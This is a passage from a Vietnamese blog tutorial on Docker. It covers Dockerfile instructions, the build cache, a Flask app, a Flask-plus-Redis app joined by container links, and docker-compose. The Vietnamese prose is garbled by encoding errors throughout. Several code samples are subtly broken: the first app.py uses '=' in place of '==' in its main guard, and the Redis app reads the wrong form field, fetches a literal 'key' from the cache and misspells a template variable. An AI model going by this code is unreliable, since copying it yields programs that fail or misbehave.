rayinaw/debian:update</span></span><br><span class="line">GÃµ git trong terminal cá»§a debian chÃºng ta táº¡o, git Ä‘Ã£ Ä‘Æ°á»£c cÃ i vÃ o image má»›i thÃ nh cÃ´ng.</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="Build-Docker-Images-by-writing-DockerFile"><a href="#Build-Docker-Images-by-writing-DockerFile" class="headerlink" title="Build Docker Images by writing DockerFile:"></a>Build Docker Images by writing DockerFile:</h2><h3 id="Dockerfile-la-gi"><a href="#Dockerfile-la-gi" class="headerlink" title="Dockerfile lÃ  gÃ¬?"></a>Dockerfile lÃ  gÃ¬?</h3><p>Dockerfile lÃ  má»™t file vÄƒn báº£n chá»©a nhá»¯ng lá»‡nh user cung cáº¥p Ä‘á»ƒ build cÃ¡c image má»™t cÃ¡ch tá»± Ä‘á»™ng tá»« Dockerfile. TÃªn cá»§a Dockerfile pháº£i lÃ  <code>Dockerfile</code> vá»›i D viáº¿t hoa á»Ÿ Ä‘áº§u.<br>Má»—i lá»‡nh trong Dockerfile sáº½ táº¡o má»™t image layer má»›i Ä‘á»‘i vá»›i image nÃ y. CÃ¡c lá»‡nh sáº½ chá»‰ Ä‘á»‹nh Ä‘iá»u cáº§n lÃ m khi building image.<br>Khi building image, Docker sáº½ thá»±c hiá»‡n quy trÃ¬nh tÆ°Æ¡ng tá»± nhÆ° viá»‡c chÃºng ta build báº±ng commit command. Docker sáº½ build láº§n lÆ°á»£t tá»«ng layer, khi build xong á»Ÿ trong lá»›p writable container, nÃ³ sáº½ viáº¿t xuá»‘ng image má»›i, sau Ä‘Ã³ remove container Ä‘Ã³, rá»“i láº§n lÆ°á»£t theo trÃ¬nh tá»± Ä‘Ã³ cho Ä‘áº¿n khi build Ä‘á»§ cÃ¡c layer trong Dockerfile. Viá»‡c viáº¿t xuá»‘ng image mÃ¬nh khÃ´ng biáº¿t nÃ³ lÆ°u á»Ÿ Ä‘Ã¢u, náº¿u muá»‘n tÃ¬m hiá»ƒu cÃ¡c báº¡n cÃ³ thá»ƒ tÃ¬m hiá»ƒu thÃªm vá» Docker daemon.</p><h3 id="Viet-mot-Dockerfile"><a href="#Viet-mot-Dockerfile" class="headerlink" title="Viáº¿t má»™t Dockerfile:"></a>Viáº¿t má»™t Dockerfile:</h3><p>CÃ¢u lá»‡nh Ä‘áº§u tiÃªn trong <code>Dockerfile</code> lÃ  cÃ¢u lá»‡nh <code>FROM</code> (viáº¿t hoa Ä‘á»ƒ phÃ¢n biá»‡t vá»›i from arguments), dÃ¹ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh base image.</p><h4 id="Cau-lenh-RUN"><a href="#Cau-lenh-RUN" class="headerlink" title="CÃ¢u lá»‡nh RUN:"></a>CÃ¢u lá»‡nh RUN:</h4><ul><li>DÃ¹ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh cÃ¢u lá»‡nh thá»±c thi khi cháº¡y base image.</li><li>CÃ¢u lá»‡nh RUN sáº½ thá»±c thi cÃ¢u lá»‡nh trong writable layer cá»§a container, sau Ä‘Ã³ commit container xuá»‘ng image má»›i.</li><li>Image má»›i nÃ y sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng cho bÆ°á»›c tiáº¿p theo trong Dockerfile. VÃ¬ váº­y má»—i láº§n RUN lá»‡nh, nÃ³ sáº½ táº¡o ra má»™t image layer má»›i.<br>VÃ­ dá»¥ tÆ°Æ¡ng tá»± nhÆ° cÃ¡ch build qua Docker commit:<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Äáº·t tÃªn file lÃ  Dockerfile nhÃ©.</span></span><br><span class="line"><span class="comment"># LÆ°u Ã½ phiÃªn báº£n ubuntu táº¡o pháº£i Ä‘Æ°á»£c há»— trá»£, náº¿u khÃ´ng khi cháº¡y lá»‡nh update nÃ³ sáº½ bÃ¡o lá»—i. MÃ¬nh chÆ°a biáº¿t fix nÃªn khÃ´ng nÃ³i rÃµ nhÃ© :).</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br></pre></td></tr></table></figure>BÃ¢y giá» truy cáº­p vÃ o folder chá»©a Dockerfile rá»“i gÃµ lá»‡nh <code>docker build -t ubuntu:own .</code></li></ul><p>Viáº¿t gá»n cÃ¡c cÃ¢u lá»‡nh trÃªn:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span></span><br><span class="line"><span class="language-bash">git \</span></span><br><span class="line"><span class="language-bash">vim</span></span><br></pre></td></tr></table></figure><h4 id="Cau-lenh-CMD"><a href="#Cau-lenh-CMD" class="headerlink" title="CÃ¢u lá»‡nh CMD:"></a>CÃ¢u lá»‡nh CMD:</h4><p>KhÃ¡c vá»›i RUN, cÃ¢u lá»‡nh CMD sáº½ khÃ´ng thá»±c thi trong quÃ¡ trÃ¬nh build image, nÃ³ chá»‰ thá»±c thi khi khá»Ÿi cháº¡y container cá»§a image Ä‘Ã³. </p><p>CÃ¡i nÃ y nhÃ¬n vÃ­ dá»¥ lÃ  dá»… hiá»ƒu nháº¥t:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>Cháº¡y <code>docker build -t test .</code> Ä‘á»ƒ build image. </p><p>BÃ¢y giá» cháº¡y <code>docker run test</code> nÃ³ sáº½ thá»±c thi lá»‡nh bÃªn trong container nÃ y. NÃ³ tÆ°Æ¡ng á»©ng vá»›i lÃºc chÃºng ta cháº¡y lá»‡nh <code>docker run test ls /</code>.</p><p>Náº¿u chÃºng ta cháº¡y lá»‡nh trá»±c tiáº¿p trÃªn command line nhÆ° <code>docker run test echo &quot;hello world&quot;</code> thÃ¬ nÃ³ chá»‰ thá»±c thi lá»‡nh nÃ y vÃ  bá» qua lá»‡nh Ä‘Æ°á»£c viáº¿t á»Ÿ CMD trong Dockerfile.</p><h4 id="Cau-lenh-ENTRYPOINT"><a href="#Cau-lenh-ENTRYPOINT" class="headerlink" title="CÃ¢u lá»‡nh ENTRYPOINT"></a>CÃ¢u lá»‡nh ENTRYPOINT</h4><p>NhÆ° vÃ­ dá»¥ á»Ÿ cÃ¢u lá»‡nh CMD, náº¿u chÃºng ta thá»±c hiá»‡n <code>docker run test echo &quot;hello world&quot;</code> thÃ¬ nÃ³ sáº½ bá» qua cÃ¢u lá»‡nh <code>ls /</code>. </p><p>ÄÃ³ lÃ  Ä‘iá»u mÃ  ta khÃ´ng mong muá»‘n náº¿u nhÆ° build image mÃ  lá»¡ cÃ³ ai má»›i há»c cháº¡y chÆ°Æ¡ng trÃ¬nh cá»§a ta khÃ´ng Ä‘Æ°á»£c :). </p><p>Do Ä‘Ã³ lá»‡nh ENTRYPOINT giÃºp ta trÃ¡nh Ä‘iá»u Ä‘Ã³:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>BÃ¢y giá» náº¿u cháº¡y <code>docker run test echo &quot;hello world&quot;</code> thÃ¬ nÃ³ váº«n chá»‰ cháº¡y cÃ¢u lá»‡nh cá»§a <code>ENTRYPOINT</code> mÃ  khÃ´ng cháº¡y cÃ¢u lá»‡nh Ä‘Äƒng sau <code>docker run</code> bá»Ÿi vÃ¬ nÃ³ lÃ  Ä‘iá»ƒm cuá»‘i rá»“i.</p><h4 id="Docker-cache"><a href="#Docker-cache" class="headerlink" title="Docker cache:"></a>Docker cache:</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br></pre></td></tr></table></figure><p>Náº¿u chÃºng ta build Dockerfile trÃªn tá»« láº§n thá»© 2 trá»Ÿ Ä‘i nÃ³ sáº½ build nhanh hÆ¡n láº§n Ä‘áº§u tiÃªn, bá»Ÿi vÃ¬ nÃ³ sá»­ dá»¥ng láº¡i layer Ä‘Ã£ build. CÃ¡i nÃ y liÃªn quan Ä‘áº¿n docker cache. Má»—i layer riÃªng láº» build á»Ÿ trong má»—i láº§n build image, nÃ³ Ä‘á»u Ä‘Æ°á»£c ghi láº¡i á»Ÿ docker cache Ä‘á»ƒ sá»­ dá»¥ng láº¡i (riÃªng láº» luÃ´n chá»© khÃ´ng pháº£i sá»­ dá»¥ng theo tá»«ng image).</p><p>VÃ­ dá»¥:<br>Build image 1:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>          <span class="comment"># --&gt; cache</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update      <span class="comment"># --&gt; cache</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git <span class="comment"># --&gt; cache</span></span></span><br></pre></td></tr></table></figure><p>Build image 2:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>          <span class="comment"># --&gt; reuse</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update      <span class="comment"># --&gt; reuse</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim <span class="comment"># --&gt; CÃ¢u lá»‡nh nÃ y khÃ¡c vÃ  layer tÆ°Æ¡ng á»©ng vá»›i cÃ¢u lá»‡nh nÃ y chÆ°a Ä‘Æ°á»£c táº¡o nÃªn sáº½ thá»±c hiá»‡n táº¡o layer má»›i vÃ  Ä‘Æ°Æ¡ng nhiÃªn sáº½ cache láº¡i.</span></span></span><br></pre></td></tr></table></figure><p>Äá»ƒ khÃ´ng cache láº¡i, chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng cá» <code>--no-cache=true</code>, mÃ  cá» nÃ y hÆ¡i pháº¿ nhá»‰, xÃ i lÃ m gÃ¬ :).<br><code>docker build -t test . --no-cache=true</code></p><h4 id="Cau-lenh-COPY"><a href="#Cau-lenh-COPY" class="headerlink" title="CÃ¢u lá»‡nh COPY:"></a>CÃ¢u lá»‡nh COPY:</h4><p>DÃ¹ng Ä‘á»ƒ copy file hay thÆ° má»¥c tá»« build context (nÆ¡i chá»©a Dockerfile vÃ  nhá»¯ng file cáº§n thiáº¿t) vÃ o file há»‡ thá»‘ng cá»§a container. VÃ­ dá»¥:<br>Ná»™i dung Dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y vim</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> abc.txt /src/abc.txt</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/src/abc.txt&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>CÃ¹ng thÆ° má»¥c vá»›i Dockerfile, táº¡o má»™t file abc.txt ghi ná»™i dung gÃ¬ Ä‘Ã³ Ä‘á»ƒ test~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t addfile .</span><br><span class="line">&gt; docker run addfile</span><br><span class="line">abc.txt file ne</span><br></pre></td></tr></table></figure><p>File abc.txt Ä‘Ã£ Ä‘Æ°á»£c copy vÃ o thÆ° má»¥c src cá»§a container.</p><h4 id="Cau-lenh-ADD"><a href="#Cau-lenh-ADD" class="headerlink" title="CÃ¢u lá»‡nh ADD:"></a>CÃ¢u lá»‡nh ADD:</h4><p>CÃ¢u lá»‡nh nÃ y gáº§n nhÆ° tÆ°Æ¡ng tá»± vá»›i cÃ¢u lá»‡nh COPY, Ä‘iá»ƒm khÃ¡c á»Ÿ Ä‘Ã¢y lÃ  ADD khÃ´ng chá»‰ copy tá»« context mÃ  cÃ²n cÃ³ thá»ƒ download tá»« internet vÃ  copy vÃ o container.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD https://example.com/big.tar.xz /usr/src/things/</span><br></pre></td></tr></table></figure><p>ADD cÅ©ng cÃ³ thá»ƒ tá»± Ä‘á»™ng giáº£i nÃ©n file Ä‘Æ°á»£c táº¡i vá» vá»›i má»™t vÃ i Ä‘á»‹nh dáº¡ng Ä‘Æ°á»£c há»— trá»£.</p><h4 id="Cau-lenh-WORKDIR"><a href="#Cau-lenh-WORKDIR" class="headerlink" title="CÃ¢u lá»‡nh WORKDIR:"></a>CÃ¢u lá»‡nh WORKDIR:</h4><p>CÃ¢u lá»‡nh nÃ y dÃ¹ng Ä‘á»ƒ táº¡o folder chá»‰ Ä‘á»‹nh vÃ  truy cáº­p Ä‘áº¿n folder Ä‘Ã³. <code>WORKDIR /app</code></p><h4 id="Xay-dung-Flask-web-don-gian-qua-Dockerfile"><a href="#Xay-dung-Flask-web-don-gian-qua-Dockerfile" class="headerlink" title="XÃ¢y dá»±ng Flask web Ä‘Æ¡n giáº£n qua Dockerfile:"></a>XÃ¢y dá»±ng Flask web Ä‘Æ¡n giáº£n qua Dockerfile:</h4><p><code>Python image</code>: Python image lÃ  má»™t image Ä‘Æ°á»£c xÃ¢y dá»±ng dá»±a trÃªn base image lÃ  <code>Alpine Linux</code>. Trong <code>Alpine Linux</code> nÃ y ngÆ°á»i ta sáº½ cÃ i python compiler vÃ o. CÃ¡i nÃ y lÃ  tráº£ lá»i tháº¯c máº¯c cho viá»‡c táº¡i sao python lÃ  compile mÃ  láº¡i cÃ³ workdir cÃ¡c kiá»ƒu ~</p><p>Äáº§u tiÃªn táº¡o thÆ° má»¥c app. Trong thÆ° má»¥c nÃ y sáº½ chá»©a Dockerfile vÃ  má»™t thÆ° má»¥c khÃ¡c chá»©a file app.py, Ä‘áº·t lÃ  app luÃ´n cho dá»… nhÃ©.<br>File app.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Ná»™i dung Dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>-alpine</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install Flask==2.0.2</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app /app</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>Build image: <code>docker build -t flaskweb .</code><br>Cháº¡y web: <code>docker run -d -p 5000:5000 flaskweb</code><br>BÃ¢y giá» trÃªn browser gÃµ <a href="http://localhost:5000/">http://localhost:5000</a> Ä‘á»ƒ truy cáº­p web vá»«a cháº¡y.</p><h4 id="Docker-Container-Links"><a href="#Docker-Container-Links" class="headerlink" title="Docker Container Links:"></a>Docker Container Links:</h4><p>Container links cho phÃ©p cÃ¡c container tÃ¬m ra nhau vÃ  trao Ä‘á»•i thÃ´ng tin má»™t cÃ¡ch báº£o máº­t vá»›i nhau.<br>Khi set up má»™t cÃ¡i link, chÃºng ta táº¡o ra má»™t á»‘ng dáº«n giá»¯a source container vÃ  recipient container. Recipient container cÃ³ thá»ƒ truy cáº­p, láº¥y dá»¯ liá»‡u vÃ  thÃªm dá»¯ liá»‡u tá»« source container.<br>Links Ä‘Æ°á»£c thÃ nh láº­p báº±ng cÃ¡ch sá»­ dá»¥ng container name. Lá»£i Ã­ch cá»§a viá»‡c nÃ y lÃ  chÃºng ta cÃ³ thá»ƒ tháº¥y má»™t cÃ¡ch rÃµ rÃ ng hÆ¡n, khÃ´ng cáº§n pháº£i thÃ´ng qua localhost.<br>VÃ­ dá»¥ xÃ¢y dá»±ng má»™t web app tá»« flask vÃ  redis (api Ä‘á»ƒ lÆ°u trá»¯ dá»¯ liá»‡u):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CÃ¢y thÆ° má»¥c nhÆ° sau:</span><br><span class="line">Dockerfile      </span><br><span class="line">app       --------&gt;app.py</span><br><span class="line">               |</span><br><span class="line">               ---&gt;templates-----&gt;index.html </span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>simple service<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">key</span> &#125;&#125;&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cache_value&quot;</span> <span class="attr">value</span>=<span class="string">&#123;&#123;</span> <span class="attr">cahe_value</span> &#125;&#125;&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;load&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;save&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">default_key = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">cache = redis.StrictRedis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">cache.<span class="built_in">set</span>(default_key, <span class="string">&quot;one&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = default_key</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> request.form:</span><br><span class="line">        key = request.form[<span class="string">&#x27;form&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;submit&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>:</span><br><span class="line">        cache.<span class="built_in">set</span>(key, request.form[<span class="string">&#x27;cache_value&#x27;</span>])</span><br><span class="line">    cache_value = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> cache.get(key):</span><br><span class="line">        cache_value=cache.get(<span class="string">&#x27;key&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, key=key, cache_value=cache_value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.8-alpine</span><br><span class="line">RUN pip install Flask==2.0.2 redis==2.10.5</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY app /app</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><p>Pull vÃ  khá»Ÿi cháº¡y redis: <code>docker run -d --name redis redis:3.2.0</code><br>Build image: <code>docker build -t dockerapp:v0.1 .</code><br>Khá»Ÿi cháº¡y image vÃ  link vá»›i redis: <code>docker run -d -p 5000:5000 --link redis dockerapp:v0.1</code></p><h4 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker compose"></a>Docker compose</h4><p>CÃ¡c thuá»™c tÃ­n trong docker compose:</p><ul><li>version: chá»‰ ra phiÃªn báº£n docker-compose Ä‘Ã£ sá»­ dá»¥ng.</li><li>services: thiáº¿t láº­p cÃ¡c services(containers) muá»‘n cÃ i Ä‘áº·t vÃ  cháº¡y.</li><li>image: chá»‰ ra image Ä‘Æ°á»£c sá»­ dá»¥ng trong lÃºc táº¡o ra container.</li><li>build: dÃ¹ng Ä‘á»ƒ táº¡o container.</li><li>ports: thiáº¿t láº­p ports cháº¡y táº¡i mÃ¡y host vÃ  trong container.</li><li>restart: tá»± Ä‘á»™ng khá»Ÿi cháº¡y khi container bá»‹ táº¯t.</li><li>environment: thiáº¿t láº­p biáº¿n mÃ´i trÆ°á»ng ( thÆ°á»ng sá»­ dá»¥ng trong lÃºc config cÃ¡c thÃ´ng sá»‘ cá»§a db).</li><li>depends_on: chá»‰ ra sá»± phá»¥ thuá»™c. Tá»©c lÃ  services nÃ o pháº£i Ä‘Æ°á»£c cÃ i Ä‘áº·t vÃ  cháº¡y trÆ°á»›c thÃ¬ service Ä‘Æ°á»£c config táº¡i Ä‘Ã³ má»›i Ä‘Æ°á»£c cháº¡y.</li><li>volumes: dÃ¹ng Ä‘á»ƒ mount hai thÆ° má»¥c trÃªn host vÃ  container vá»›i nhau.</li></ul><p>CÅ©ng nhÆ° vÃ­ dá»¥ á»Ÿ trÃªn, thay vÃ¬ chÃºng ta pull, build image rá»“i khá»Ÿi cháº¡y rÆ°á»m rÃ . ChÃºng ta cÃ³ thá»ƒ viáº¿t má»™t <code>docker compose</code> rá»“i khá»Ÿi cháº¡y chá»‰ vá»›i má»™t cÃ¢u lá»‡nh <code>docker-compose up</code>. Docker compose file cáº§n tuÃ¢n thá»§ nghiÃªm ngáº·t thá»¥t lá», má»—i láº§n thá»¥t lÃ  2 khoáº£ng tráº¯ng.<br>File name: docker-compose.yml, nÃ³ pháº£i náº±m chung thÆ° má»¥c vá»›i Dockerfile.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">dockerapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:3.2.0</span></span><br></pre></td></tr></table></figure><p>Khá»Ÿi cháº¡y gÃµ <code>docker-compose up</code> hoáº·c thÃªm cá» -d <code>docker-compose up -d</code> Ä‘á»ƒ treo trong container.<br>Docker compose sáº½ khÃ´ng build láº¡i image náº¿u image Ä‘Ã³ Ä‘Ã£ tá»“n táº¡i, vÃ¬ váº­y khi ta thay Ä‘á»•i má»™t vÃ i lá»‡nh trong Dockerfile docker-compose váº«n láº¥y image cÅ© Ä‘á»ƒ thao tÃ¡c. Äá»ƒ build láº¡i má»™t image má»›i, chÃºng ta cáº§n sá»­ dá»¥ng lá»‡nh <code>docker-compose build</code>.</p>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/DevOps/">DevOps</category>
      
      <category domain="https://rayinaw.github.io/categories/DevOps/Docker/">Docker</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Docker/">Docker</category>
      
      
